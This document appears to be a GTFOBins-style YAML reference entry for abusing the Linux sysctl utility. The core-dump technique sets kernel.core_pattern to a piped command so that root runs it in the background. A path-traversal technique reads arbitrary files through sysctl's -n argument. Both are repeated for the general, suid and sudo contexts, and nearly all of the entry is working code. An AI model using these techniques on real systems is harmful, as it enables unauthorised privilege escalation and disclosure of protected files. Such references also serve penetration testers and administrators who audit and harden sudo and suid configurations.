---
functions:
  command:
    - description: The command is executed by root in the background when a core dump occurs.
    - code: |
        COMMAND='/bin/bash -c id>/tmp/id'
        sysctl "kernel.core_pattern=|$COMMAND"
        sleep 9999 &
        kill -QUIT $!
        cat /tmp/id

  file-read:
    - description: The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.
    - code: |
        LFILE=file_to_read
        /usr/sbin/sysctl -n "/../../$LFILE"
  suid:
    - code: |
        COMMAND='/bin/bash -c id>/tmp/id'
        sysctl "kernel.core_pattern=|$COMMAND"
        sleep 9999 &
        kill -QUIT $!
        cat /tmp/id
    - code: |
        LFILE=file_to_read
        ./sysctl -n "/../../$LFILE"
  sudo:
    - code: |
        COMMAND='/bin/bash -c id>/tmp/id'
        sudo sysctl "kernel.core_pattern=|$COMMAND"
        sleep 9999 &
        kill -QUIT $!
        cat /tmp/id
    - code: |
        LFILE=file_to_read
        sudo sysctl -n "/../../$LFILE"
---
